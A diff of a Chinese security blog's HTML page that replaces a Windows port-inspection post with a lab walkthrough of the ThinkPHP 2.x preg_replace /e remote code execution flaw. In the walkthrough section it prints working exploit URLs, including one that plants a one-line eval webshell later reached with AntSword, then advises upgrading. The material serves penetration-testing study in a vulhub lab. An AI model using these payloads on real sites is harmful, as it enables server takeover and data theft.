@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="0x01 查看端口状态\r命令:\n1 netstat -ano 连接状态有一下几种\nLISTENING：表示监听\u00a0，表示这个端口处于开放状态，\u00a0可以提供服务 ESTABLISHED&quot;：表示是对方与你已经连接\u00a0正在通信交换数据 CLOSING：表示关闭的\u00a0表示端口人为或者防火墙使其关闭(也许服务被卸载) TIME WAIT\u00a0：表示正在等待连接\u00a0就是你正在向该端口发送请求连接状态\n通过netstat查看网络连接，每条连接后面都有一个PID号，根据PID号可以定位出是哪个进程在监听这个端口 直接查看程序与外部地址的已建立的连接情况\r命令:\n">
-<title>【蓝队】windows 端口排查案例</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="0x00 实验环境\r攻击机：Win 11\n靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）\nvulhub靶场下载地址：\n1 https://vulhub.org/zh#/environments/thinkphp/2-rce/ 部署：\n1 2 3 cd vulhub-master/thinkphp/2-rce docker-compose up -d docker ps ">
+<title>【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行</title>
 
-<link rel='canonical' href='http://localhost:1313/p/%E8%93%9D%E9%98%9Fwindows-%E7%AB%AF%E5%8F%A3%E6%8E%92%E6%9F%A5%E6%A1%88%E4%BE%8B/'>
+<link rel='canonical' href='http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/'>
 
-<link rel="stylesheet" href="/scss/style.min.11207ff81409bbe9433b02843a9ded640f4a8e3b1a8a586bb557251116607463.css"><meta property='og:title' content="【蓝队】windows 端口排查案例">
-<meta property='og:description' content="0x01 查看端口状态\r命令:\n1 netstat -ano 连接状态有一下几种\nLISTENING：表示监听\u00a0，表示这个端口处于开放状态，\u00a0可以提供服务 ESTABLISHED&quot;：表示是对方与你已经连接\u00a0正在通信交换数据 CLOSING：表示关闭的\u00a0表示端口人为或者防火墙使其关闭(也许服务被卸载) TIME WAIT\u00a0：表示正在等待连接\u00a0就是你正在向该端口发送请求连接状态\n通过netstat查看网络连接，每条连接后面都有一个PID号，根据PID号可以定位出是哪个进程在监听这个端口 直接查看程序与外部地址的已建立的连接情况\r命令:\n">
-<meta property='og:url' content='http://localhost:1313/p/%E8%93%9D%E9%98%9Fwindows-%E7%AB%AF%E5%8F%A3%E6%8E%92%E6%9F%A5%E6%A1%88%E4%BE%8B/'>
+<link rel="stylesheet" href="/scss/style.min.11207ff81409bbe9433b02843a9ded640f4a8e3b1a8a586bb557251116607463.css"><meta property='og:title' content="【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行">
+<meta property='og:description' content="0x00 实验环境\r攻击机：Win 11\n靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）\nvulhub靶场下载地址：\n1 https://vulhub.org/zh#/environments/thinkphp/2-rce/ 部署：\n1 2 3 cd vulhub-master/thinkphp/2-rce docker-compose up -d docker ps ">
+<meta property='og:url' content='http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/'>
 <meta property='og:site_name' content='Slimer'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-28T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-28T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/6.webp' />
-<meta name="twitter:title" content="【蓝队】windows 端口排查案例">
-<meta name="twitter:description" content="0x01 查看端口状态\r命令:\n1 netstat -ano 连接状态有一下几种\nLISTENING：表示监听\u00a0，表示这个端口处于开放状态，\u00a0可以提供服务 ESTABLISHED&quot;：表示是对方与你已经连接\u00a0正在通信交换数据 CLOSING：表示关闭的\u00a0表示端口人为或者防火墙使其关闭(也许服务被卸载) TIME WAIT\u00a0：表示正在等待连接\u00a0就是你正在向该端口发送请求连接状态\n通过netstat查看网络连接，每条连接后面都有一个PID号，根据PID号可以定位出是哪个进程在监听这个端口 直接查看程序与外部地址的已建立的连接情况\r命令:\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='http://localhost:1313/images/6.webp' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-02T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/29.webp' />
+<meta name="twitter:title" content="【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行">
+<meta name="twitter:description" content="0x00 实验环境\r攻击机：Win 11\n靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）\nvulhub靶场下载地址：\n1 https://vulhub.org/zh#/environments/thinkphp/2-rce/ 部署：\n1 2 3 cd vulhub-master/thinkphp/2-rce docker-compose up -d docker ps "><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/images/29.webp' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -247,8 +247,10 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#0x01-查看端口状态">0x01 查看端口状态</a></li>
-    <li><a href="#0x02-根据pid定位进程">0x02 根据PID定位进程</a></li>
+    <li><a href="#0x00-实验环境">0x00 实验环境</a></li>
+    <li><a href="#0x01-影响版本">0x01 影响版本</a></li>
+    <li><a href="#0x02-漏洞复现">0x02 漏洞复现</a></li>
+    <li><a href="#0x02-漏洞修复">0x02 漏洞修复</a></li>
   </ul>
 </nav>
         </div>
@@ -263,9 +265,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/%E8%93%9D%E9%98%9Fwindows-%E7%AB%AF%E5%8F%A3%E6%8E%92%E6%9F%A5%E6%A1%88%E4%BE%8B/">
+            <a href="/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
                 
-                    <img src="/images/6.webp" loading="lazy" alt="Featured image of post 【蓝队】windows 端口排查案例" />
+                    <img src="/images/29.webp" loading="lazy" alt="Featured image of post 【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行" />
                 
             </a>
         </div>
@@ -275,8 +277,16 @@
     
     <header class="article-category">
         
-            <a href="/categories/%E8%93%9D%E9%98%9F/" style="background-color: #0077b6; color: #ffffff;">
-                蓝队
+            <a href="/categories/web%E6%94%BB%E9%98%B2/" style="background-color: #2a9d8f; color: #fff;">
+                Web攻防
+            </a>
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #1d3557; color: #f1faee;">
+                渗透测试
+            </a>
+        
+            <a href="/categories/%E9%9D%B6%E5%9C%BA/" style="background-color: #9b2226; color: #f5ebe0;">
+                靶场
             </a>
         
 		
@@ -285,7 +295,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E8%93%9D%E9%98%9Fwindows-%E7%AB%AF%E5%8F%A3%E6%8E%92%E6%9F%A5%E6%A1%88%E4%BE%8B/">【蓝队】windows 端口排查案例</a>
+            <a href="/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行</a>
         </h2>
     
         
@@ -309,7 +319,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025年08月28日</time>
+                <time class="article-time--published">2025年09月02日</time>
             </time>
 </div>
 			
@@ -328,17 +338,81 @@
     <section class="article-content">
     
     
-    <h1 id="0x01-查看端口状态">0x01 查看端口状态
-</h1><p>命令:</p>
+    <h1 id="0x00-实验环境">0x00 实验环境
+</h1><p>攻击机：Win 11<br>
+靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）<br>
+vulhub靶场下载地址：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat -ano      
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://vulhub.org/zh#/environments/thinkphp/2-rce/
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828153540.png"
+</div><p>部署：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd vulhub-master/thinkphp/2-rce 
+</span></span><span class="line"><span class="cl">docker-compose up -d 
+</span></span><span class="line"><span class="cl">docker ps
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134038.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image.png"
+	
+	
+></p>
+<h1 id="0x01-影响版本">0x01 影响版本
+</h1><p><strong>标志</strong>：/index.php<br>
+<strong>版本</strong>：thinkphp2.x<br>
+<strong>简介</strong>：在ThinkPHP 2.x版本中，使用preg_replace的<code>/e</code>模式匹配路由：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">res</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s1">&#39;@(\w+)&#39;</span><span class="o">.$</span><span class="n">depr</span><span class="o">.</span><span class="s1">&#39;([^&#39;</span><span class="o">.$</span><span class="n">depr</span><span class="o">.</span><span class="s1">&#39;\/]+)@e&#39;</span><span class="p">,</span> <span class="s1">&#39;$var[</span><span class="se">\&#39;\\</span><span class="s1">1</span><span class="se">\&#39;</span><span class="s1">]=&#34;</span><span class="se">\\</span><span class="s1">2&#34;;&#39;</span><span class="p">,</span> <span class="n">implode</span><span class="p">(</span><span class="o">$</span><span class="n">depr</span><span class="p">,</span><span class="o">$</span><span class="n">paths</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞<br>
+大体说的还是因为php版本在<strong>5.6.29</strong>以下时都是支持该函数执行中间的命令的，可到了<strong>7.x</strong>就不支持了。简单来讲就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">preg_replace(&#39;正则规则&#39;,&#39;替换字符&#39;,&#39;目标字符&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>e</strong> 配合函数<strong>preg_replace()使用</strong>, 可以把匹配来的字符串当作正则表达式执行;<br>
+<strong>/e</strong> 可执行模式，此为PHP专有参数，例如preg_replace函数。<br>
+例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">@preg_replace(&#39;/test/e&#39;,&#39;print_r(&#34;AAA&#34;);&#39;,&#39;just test&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。</p>
+<h1 id="0x02-漏洞复现">0x02 漏洞复现
+</h1><p>注：复现是比较简单的，原理需要自己去深入剖析<br>
+（1）访问页面<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134411.png"
 	
 	
 	
@@ -348,111 +422,16 @@
 	
 	
 ><br>
-连接状态有一下几种</p>
-<ul>
-<li>LISTENING：表示<strong>监听</strong> ，表示这个端口处于<strong>开放状态，</strong> 可以提供服务</li>
-<li>ESTABLISHED&quot;：表示是对方与你<strong>已经连接</strong> 正在通信交换数据</li>
-<li>CLOSING：表示<strong>关闭的</strong> 表示端口人为或者防火墙使其关闭(也许服务被卸载)</li>
-<li>TIME WAIT ：表示正在<strong>等待连接</strong> 就是你正在向该端口发送请求连接状态<br>
-通过netstat查看网络连接，每条连接后面都有一个PID号，根据PID号可以定位出是哪个进程在监听这个端口</li>
-</ul>
-<h4 id="直接查看程序与外部地址的已建立的连接情况">直接查看程序与外部地址的已建立的连接情况
-</h4><p>命令:</p>
+（2）使用报错爆出thinkphp的版本2.1：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat -b
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.197.140:8080/index.php/111
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>显示在创建每个连接或侦听端口时涉及的可执行程序，需要管理员权限，这条程序对于查找可疑程序非常有帮助<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828153728.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image.png"
-	
-	
-></p>
-<p>或者我们先通过查看网络连接状态，查看pid再通过PID定位程序</p>
-<h4 id="查看已建立的连接">查看已建立的连接
-</h4><p>通过如下命令我们优先查找已建立的连接，看是否存在可疑的连接</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat -ano|findstr &#34;ES&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如下，我们发现一条可疑tcp连接，本机与一个外部的地址的一个特殊端口已经建立了连接，pid号为5840。（我们要着重观察本地是否与外部地址的特殊端口进行连接）<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828153714.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image.png"
-	
-	
-></p>
-<h1 id="0x02-根据pid定位进程">0x02 根据PID定位进程
-</h1><p>命令:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tasklist
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>tasklist ：显示运行在本地或远程计算机上的所有进程。如下图显示了进程对应的PID号<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828153755.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image.png"
-	
-	
-></p>
-<h4 id="pid定位进程">PID定位进程
-</h4><p>上面我们发现了一个可疑的TCP连接，pid号为5840，现在通过这pid定位程序</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tasklist | findstr &#34;5840&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如下可知，5840对一个的程序为payload2.exe<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828153808.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image.png"
-	
-	
-></p>
-<h4 id="获取进程的全路径">获取进程的全路径
-</h4><p>命令:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">wmic</span> <span class="nx">process</span> <span class="o">|</span> <span class="nx">findstr</span> <span class="s2">&#34;payload2.exe&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如下，显示了程序的全路径<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828153938.png"
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134632.png"
 	
 	
 	
@@ -462,17 +441,8 @@
 	
 	
 ><br>
-或者通过任务管理器找到该进程，再打开进程所在路径</p>
-<h4 id="杀死进程">杀死进程
-</h4><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">taskkill /f /pid  pid号     # /f为强制的意思
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828153948.png"
+ （3）抓包或者使用插件查看一下有没有php的版本号，上面有介绍过，那个命令执行的触发条件&lt;=php5.6.29，下面这个版本是满足条件的：<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134623.png"
 	
 	
 	
@@ -482,7 +452,59 @@
 	
 	
 ><br>
-注：以上可疑程序的payload为MSF的payload。CS的payload通过上述方式并不能查看到，可知CS的payload隐蔽性还是很高的。</p>
+（4）漏洞利用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.197.140:8080/index.php?s=/index/index/xxx/${@phpinfo()}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134735.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image.png"
+	
+	
+><br>
+（5）传马，使用以下语句（类似于在该页面写入了一句话木马）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.197.140:8080/index.php?s=/Index/index/xxx/${@print(eval($_POST[1]))}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>菜刀与蚁剑均能连接：<br>
+蚁剑连接：<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135056.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image.png"
+	
+	
+><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135103.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image.png"
+	
+	
+></p>
+<h1 id="0x02-漏洞修复">0x02 漏洞修复
+</h1><p><strong>升级框架版本</strong><br>
+ThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。<strong>最彻底的方式是升级到官方支持的最新版本</strong>（如 ThinkPHP 5.1 或 6.x），这些版本对输入过滤、路由解析等机制进行了全面重构，安全性大幅提升。</p>
 
 </section>
 
@@ -507,18 +529,18 @@
             
                 
 <article class="has-image">
-    <a href="/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/">
+    <a href="/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/8.webp" loading="lazy" data-key="" data-hash="/images/8.webp"/>
+                    <img src="/images/15.webp" loading="lazy" data-key="" data-hash="/images/15.webp"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">【知攻善防靶场】Linux1</h2>
+            <h2 class="article-title">【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞</h2>
         </div>
     </a>
 </article>
@@ -526,18 +548,18 @@
             
                 
 <article class="has-image">
-    <a href="/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/">
+    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95spring-boot-actuator-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E9%AB%98%E5%8D%B1/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/14.webp" loading="lazy" data-key="" data-hash="/images/14.webp"/>
+                    <img src="/images/27.webp" loading="lazy" data-key="" data-hash="/images/27.webp"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">【知攻善防靶场】Linux2</h2>
+            <h2 class="article-title">【渗透测试】Spring Boot Actuator 敏感信息泄露-高危</h2>
         </div>
     </a>
 </article>
@@ -545,18 +567,56 @@
             
                 
 <article class="has-image">
-    <a href="/p/ctf%E8%A7%82%E5%AE%89%E6%9D%AFctf-ezbank/">
+    <a href="/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-emlog/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/9.webp" loading="lazy" data-key="" data-hash="/images/9.webp"/>
+                    <img src="/images/25.webp" loading="lazy" data-key="" data-hash="/images/25.webp"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">【CTF】观安杯CTF-Ezbank</h2>
+            <h2 class="article-title">【玄机靶场】第四章 windows 实战-emlog</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-wordpress/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/26.webp" loading="lazy" data-key="" data-hash="/images/26.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【玄机靶场】第四章 windows 实战-wordpress</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/thinkphp%E8%AF%86%E5%88%ABtp%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9-01/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/22.webp" loading="lazy" data-key="" data-hash="/images/22.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【Thinkphp】识别tp框架(指纹)-01</h2>
         </div>
     </a>
 </article>
